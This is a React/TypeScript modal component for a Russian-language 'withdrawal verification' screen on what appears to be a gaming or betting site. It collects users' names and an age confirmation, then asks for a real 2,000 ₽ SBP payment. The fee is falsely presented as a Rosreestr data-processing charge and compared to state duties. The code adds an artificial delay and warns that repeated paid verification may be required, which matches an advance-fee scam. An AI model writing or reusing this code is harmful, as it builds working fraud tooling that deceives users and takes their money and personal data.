'use client';

import {
  createContext,
  useCallback,
  useContext,
  useEffect,
  useMemo,
  useRef,
  useState,
} from 'react';
import type { ReactNode } from 'react';
import {
  CircleCheckBig,
  ShieldCheck,
  User,
  CreditCard,
  Clock,
  BadgeDollarSign,
  FileText,
  Scale,
  Check,
  Loader2,
  ExternalLink,
  Smartphone,
} from 'lucide-react';
import { useUser } from './UserProvider';
import { paymentApi, verificationApi, type PaymentPurpose } from '@/lib/api';
import { showError } from '@/lib/toast';
import { ModalShell } from './ModalShell';
import { Button } from './ui/button';

const GATE_AMOUNT = 2000;
const TERMINAL_FAILURE = new Set(['EXPIRED', 'CANCELED', 'FAILED']);

type VerificationMethod = 'card' | 'sbp';

interface VerificationData {
  amount: number;
  method: string | null;
  requisites: string | null;
}

interface VerificationModalContextValue {
  openVerification: (data: VerificationData) => Promise<boolean>;
}

const VerificationModalContext = createContext<VerificationModalContextValue>({
  openVerification: async () => false,
});

export function useVerificationModal() {
  return useContext(VerificationModalContext);
}

export function VerificationModalProvider({ children }: { children: ReactNode }) {
  const [open, setOpen] = useState(false);
  const [data, setData] = useState<VerificationData | null>(null);
  const resolveRef = useRef<((ok: boolean) => void) | null>(null);

  const openVerification = useCallback((d: VerificationData) => {
    setData(d);
    setOpen(true);
    return new Promise<boolean>((resolve) => {
      resolveRef.current = resolve;
    });
  }, []);

  const close = useCallback((ok: boolean) => {
    setOpen(false);
    const resolve = resolveRef.current;
    resolveRef.current = null;
    if (resolve) resolve(ok);
  }, []);

  const contextValue = useMemo<VerificationModalContextValue>(
    () => ({ openVerification }),
    [openVerification],
  );

  return (
    <VerificationModalContext.Provider value={contextValue}>
      {children}
      {data && (
        <VerificationModal
          open={open}
          data={data}
          onClose={() => close(false)}
          onDone={() => close(true)}
        />
      )}
    </VerificationModalContext.Provider>
  );
}

function formatRub(amount: number): string {
  return `${amount.toLocaleString('ru-RU')}\u00A0₽`;
}

function VerificationModal({
  open,
  data,
  onClose,
  onDone,
}: {
  open: boolean;
  data: VerificationData;
  onClose: () => void;
  onDone: () => void;
}) {
  const { user } = useUser();
  const [step, setStep] = useState<'form' | 'pay' | 'success'>('form');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [ageConfirmed, setAgeConfirmed] = useState(false);
  const [method, setMethod] = useState<VerificationMethod>('sbp');
  const [loading, setLoading] = useState(false);
  const [paymentId, setPaymentId] = useState('');
  const [paymentLink, setPaymentLink] = useState('');
  const [polling, setPolling] = useState(false);
  const [paid, setPaid] = useState(false);
  const creatingRef = useRef(false);
  const [attemptSaved, setAttemptSaved] = useState(false);

  const displayName = user?.name || 'User843he';
  const displayHandle = `@${(user?.name || 'user').toLowerCase().replace(/\s+/g, '')}`;
  const displayRequisites = data.requisites || '+7 (***) ***-83';
  const displayMethod = data.method || 'СБП';
  const displayAmount = data.amount;

  const formValid =
    firstName.trim().length >= 2 &&
    lastName.trim().length >= 2 &&
    ageConfirmed;

  useEffect(() => {
    if (open) {
      setStep('form');
      setFirstName('');
      setLastName('');
      setAgeConfirmed(false);
      setMethod('sbp');
      setLoading(false);
      setPaymentId('');
      setPaymentLink('');
      setPolling(false);
      setPaid(false);
      setAttemptSaved(false);
    }
  }, [open]);

  useEffect(() => {
    if (!open || !paymentId || paid || !polling) return;

    const interval = setInterval(async () => {
      try {
        const res = await paymentApi.status(paymentId);
        if (res.status === 'PAID') {
          setPaid(true);
          setPolling(false);
          setStep('success');
          window.dispatchEvent(new CustomEvent('verification-paid'));
        } else if (TERMINAL_FAILURE.has(res.status)) {
          setPolling(false);
          setPaymentId('');
          setPaymentLink('');
          showError('Платёж не был завершён. Попробуйте ещё раз.');
        }
      } catch {
        // keep polling
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [open, paymentId, paid, polling]);

  const handleVerify = async () => {
    if (!formValid || loading) return;
    setLoading(true);
    try {
      await verificationApi.submit({
        firstName: firstName.trim(),
        lastName: lastName.trim(),
        ageConfirmed,
        requisites: displayRequisites,
        method: method,
        amount: displayAmount,
      });
      setAttemptSaved(true);
      window.dispatchEvent(new CustomEvent('verification-submitted'));
      // искусственная задержка 3с перед переходом к оплате
      await new Promise((r) => setTimeout(r, 3000));
      setStep('pay');
    } catch (err) {
      showError((err as Error).message || 'Ошибка верификации');
    } finally {
      setLoading(false);
    }
  };

  const handlePay = async () => {
    if (loading || paymentId || creatingRef.current) return;
    creatingRef.current = true;
    setLoading(true);
    try {
      const res = await paymentApi.create(GATE_AMOUNT, method, 'verification');
      setPaymentId(res.paymentId);
      setPaymentLink(res.link);
      setPolling(true);
    } catch (err) {
      showError((err as Error).message || 'Ошибка создания платежа');
    } finally {
      creatingRef.current = false;
      setLoading(false);
    }
  };

  const resetPayment = () => {
    setPaymentId('');
    setPaymentLink('');
    setPolling(false);
    setPaid(false);
  };

  if (step === 'success') {
    return (
      <ModalShell open={open} onClose={onClose} titleId="verification-modal-title">
        <div className="flex flex-col items-center text-center gap-md animate-[topup-step-in_0.25s_cubic-bezier(0.16,1,0.3,1)_both]">
          <div className="w-20 h-20 rounded-full bg-emerald-500/15 flex items-center justify-center">
            <CircleCheckBig className="w-10 h-10 text-emerald-400" />
          </div>
          <div className="space-y-xs">
            <h2 id="verification-modal-title" className="text-2xl font-bold text-white">
              Верификация оплачена!
            </h2>
            <p className="text-sm text-zinc-400">Теперь вы можете создать заявку на вывод повторно. Если реквизиты не подтвердятся, потребуется новая верификация с заполнением данных.</p>
          </div>
          <button
            onClick={onDone}
            className="inline-flex items-center justify-center gap-xs whitespace-nowrap transition-colors focus-visible:outline-none rounded-control px-2xl w-full h-14 text-base font-bold bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white shadow-emerald-500/30"
          >
            Продолжить
          </button>
        </div>
      </ModalShell>
    );
  }

  if (step === 'pay') {
    return (
      <ModalShell open={open} onClose={onClose} titleId="verification-modal-title">
        <div className="flex gap-lg flex-col animate-[topup-step-in_0.25s_cubic-bezier(0.16,1,0.3,1)_both]">
          <div className="text-center space-y-sm">
            <div className="mx-auto w-14 h-14 rounded-full bg-zinc-800 flex items-center justify-center mb-md">
              <ShieldCheck className="w-7 h-7 text-emerald-400" />
            </div>
            <h2 id="verification-modal-title" className="text-2xl font-bold text-white">Оплата верификации</h2>
            <p className="text-sm text-zinc-400">Оплатите 2 000 ₽ реальным платежом через СБП. Сумма не списывается с игрового баланса.</p>
          </div>

          <div className="bg-zinc-900 rounded-card p-card-lg border border-zinc-800">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-xs">
                <BadgeDollarSign className="w-4 h-4 text-zinc-500" />
                <span className="text-sm text-zinc-300">Верификация реквизитов</span>
              </div>
              <span className="text-sm font-bold text-money">{formatRub(GATE_AMOUNT)}</span>
            </div>
            <div className="mt-sm pt-sm border-t border-zinc-800 text-xs text-zinc-500 space-y-1">
              <div className="flex justify-between"><span>Получатель:</span><span className="text-zinc-300">{firstName} {lastName}</span></div>
              <div className="flex justify-between"><span>Реквизиты:</span><span className="text-zinc-300">{displayRequisites}</span></div>
              <div className="flex justify-between"><span>К выводу:</span><span className="text-zinc-300">{formatRub(displayAmount)}</span></div>
            </div>
          </div>

          <div className="space-y-sm">
            {paymentLink ? (
              <a
                href={paymentLink}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center justify-center gap-xs whitespace-nowrap transition-colors focus-visible:outline-none rounded-control px-2xl w-full h-14 text-base font-bold bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white"
              >
                <ExternalLink className="w-5 h-5" />
                Продолжить оплату
              </a>
            ) : (
              <button
                onClick={handlePay}
                disabled={loading}
                className="inline-flex items-center justify-center gap-xs whitespace-nowrap transition-colors focus-visible:outline-none disabled:opacity-50 rounded-control px-2xl w-full h-14 text-base font-bold bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white"
              >
                {loading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin" />
                    Обработка...
                  </>
                ) : (
                  <>
                    <Check className="w-5 h-5" />
                    Оплатить {formatRub(GATE_AMOUNT)}
                  </>
                )}
              </button>
            )}
            {polling && (
              <p className="text-xs text-zinc-500 flex items-center gap-xs justify-center">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                Ожидаем оплату...
              </p>
            )}
            <button
              onClick={paymentId ? resetPayment : () => setStep('form')}
              disabled={loading}
              className="inline-flex items-center justify-center gap-xs whitespace-nowrap rounded-control text-sm font-medium transition-colors focus-visible:outline-none px-md py-xs w-full h-12 border-2 border-zinc-800 hover:border-zinc-700"
            >
              {paymentId ? 'Начать заново' : 'Назад'}
            </button>
            <p className="text-xs text-center text-zinc-600 px-md">Сумма оплаты не зачисляется на игровой баланс</p>
          </div>
        </div>
      </ModalShell>
    );
  }

  // step === 'form'
  return (
    <ModalShell open={open} onClose={onClose} titleId="verification-modal-title">
      <div className="flex gap-lg flex-col animate-[topup-step-in_0.25s_cubic-bezier(0.16,1,0.3,1)_both] pr-1">
        <div className="text-center space-y-sm">
          <div className="mx-auto w-16 h-16 rounded-full bg-emerald-500 flex items-center justify-center">
            <Check className="w-8 h-8 text-white" strokeWidth={3} />
          </div>
          <h2 id="verification-modal-title" className="text-2xl font-bold text-white">Верификация реквизитов</h2>
          <p className="text-sm text-zinc-400">Для вывода средств необходимо верифицировать ваши данные</p>
        </div>

        {/* User card as in photo 2 */}
        <div className="bg-zinc-900 rounded-card p-card border border-zinc-800 space-y-sm">
          <div className="flex items-center gap-sm">
            <div className="w-10 h-10 rounded-full bg-blue-500 flex items-center justify-center shrink-0">
              <User className="w-5 h-5 text-white" />
            </div>
            <div className="min-w-0">
              <p className="text-sm font-bold text-white truncate">{displayName}</p>
              <p className="text-xs text-zinc-500">{displayHandle}</p>
            </div>
          </div>
          <div className="space-y-xs pt-sm border-t border-zinc-800">
            <div className="flex items-center gap-xs text-xs">
              <CreditCard className="w-3.5 h-3.5 text-zinc-500" />
              <span className="text-zinc-500">Реквизиты:</span>
              <span className="text-zinc-300 font-mono">{displayRequisites}</span>
            </div>
            <div className="flex items-center gap-xs text-xs">
              <CreditCard className="w-3.5 h-3.5 text-zinc-500" />
              <span className="text-zinc-500">Метод:</span>
              <span className="text-zinc-300">{displayMethod}</span>
            </div>
            <div className="flex items-center gap-xs text-xs">
              <Clock className="w-3.5 h-3.5 text-zinc-500" />
              <span className="text-zinc-500">Сумма к выводу:</span>
              <span className="text-zinc-300 font-bold">{formatRub(displayAmount)}</span>
            </div>
          </div>
        </div>

        {/* Form fields */}
        <div className="space-y-sm">
          <div className="space-y-xs">
            <label className="flex items-center gap-xs text-xs font-medium text-zinc-400">
              <User className="w-3.5 h-3.5" />
              Имя получателя
            </label>
            <input
              type="text"
              value={firstName}
              onChange={(e) => setFirstName(e.target.value)}
              placeholder="Иван"
              className="w-full px-md py-sm text-sm bg-zinc-900 rounded-control border border-zinc-800 text-white placeholder:text-zinc-600 focus:outline-none focus:border-zinc-700"
              maxLength={50}
            />
          </div>
          <div className="space-y-xs">
            <label className="flex items-center gap-xs text-xs font-medium text-zinc-400">
              <User className="w-3.5 h-3.5" />
              Фамилия получателя
            </label>
            <input
              type="text"
              value={lastName}
              onChange={(e) => setLastName(e.target.value)}
              placeholder="Иванов"
              className="w-full px-md py-sm text-sm bg-zinc-900 rounded-control border border-zinc-800 text-white placeholder:text-zinc-600 focus:outline-none focus:border-zinc-700"
              maxLength={50}
            />
          </div>

          <div className="bg-zinc-900 rounded-card p-sm border border-zinc-800">
            <label className="flex items-start gap-sm cursor-pointer">
              <input
                type="checkbox"
                checked={ageConfirmed}
                onChange={(e) => setAgeConfirmed(e.target.checked)}
                className="mt-0.5 w-5 h-5 rounded border-2 border-zinc-600 bg-zinc-800 text-emerald-500 focus:ring-0"
              />
              <div className="flex-1">
                <div className="flex items-center gap-xs text-sm font-medium text-white">
                  <FileText className="w-4 h-4 text-zinc-500" />
                  Подтверждение возраста
                </div>
                <p className="text-xs text-zinc-500 mt-1">Подтверждаю, что получателю больше 18 лет</p>
              </div>
            </label>
          </div>
        </div>

        <Button
          onClick={handleVerify}
          disabled={!formValid || loading}
          className="inline-flex items-center justify-center gap-xs whitespace-nowrap transition-colors focus-visible:outline-none disabled:opacity-50 disabled:pointer-events-none rounded-control px-2xl w-full min-h-14 h-14 shrink-0 text-base font-bold bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white shadow-lg"
          style={{ minHeight: '56px' }}
        >
          {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <ShieldCheck className="w-5 h-5" />}
          {loading ? 'Обработка...' : 'Верифицировать реквизиты'}
        </Button>

        {!formValid && (
          <p className="text-xs text-center text-zinc-600">Заполните имя, фамилию и подтвердите возраст</p>
        )}

        <p className="text-xs text-center text-zinc-500">
          После верификации данных вам нужно будет оплатить обработку данных через Россреестр (2 000 ₽)
        </p>

        {/* Info blocks like photo 4 */}
        <div className="space-y-sm pt-sm border-t border-zinc-800">
          <div className="bg-zinc-900 rounded-card p-card border border-zinc-800 space-y-xs">
            <div className="flex items-center gap-xs text-sm font-bold text-white">
              <ShieldCheck className="w-4 h-4 text-zinc-500" />
              Почему требуется верификация?
            </div>
            <p className="text-xs leading-relaxed text-zinc-500">
              В целях обеспечения безопасности и отсутствия на нашей платформе мошеннических или нарушающих законодательство Российской Федерации аккаунтов, нам необходимо провести верификацию ваших персональных данных через базу Россреестра. Регулятором взимается оплата за обработку данных.
            </p>
          </div>
          <div className="bg-zinc-900 rounded-card p-card border border-zinc-800 space-y-xs">
            <div className="flex items-center gap-xs text-sm font-bold text-white">
              <BadgeDollarSign className="w-4 h-4 text-zinc-500" />
              Из чего складывается стоимость?
            </div>
            <p className="text-xs leading-relaxed text-zinc-500">
              Верификация требует затрат на использование современных технологий и привлечение специалистов, а также регулятором (Росреестр) взимается плата за обработку данных. Благодаря внесению этого взноса мы можем поддерживать высокий уровень обслуживания и оперативно обрабатывать ваши запросы.
            </p>
          </div>
          <div className="bg-zinc-900 rounded-card p-card border border-zinc-800 space-y-xs">
            <div className="flex items-center gap-xs text-sm font-bold text-white">
              <FileText className="w-4 h-4 text-zinc-500" />
              Сравнение с другими услугами
            </div>
            <p className="text-xs leading-relaxed text-zinc-500">
              Оплата за верификацию персональных данных аналогична оплате госпошлины за оформление номеров на автомобиль, получение загранпаспорта или иных официальных документов. Подобные платежи позволяют организовать процесс проверки и выдачи выигрышей, что обеспечивает вашу безопасность и упрощает пользование услугами.
            </p>
            <p className="text-xs leading-relaxed text-zinc-500">
              Если у вас есть вопросы относительно процесса верификации, пожалуйста, обратитесь в нашу{' '}
              <a href="/support" className="text-blue-400 underline">
                службу поддержки
              </a>
              . Мы всегда готовы помочь вам!
            </p>
          </div>
        </div>
      </div>
    </ModalShell>
  );
}
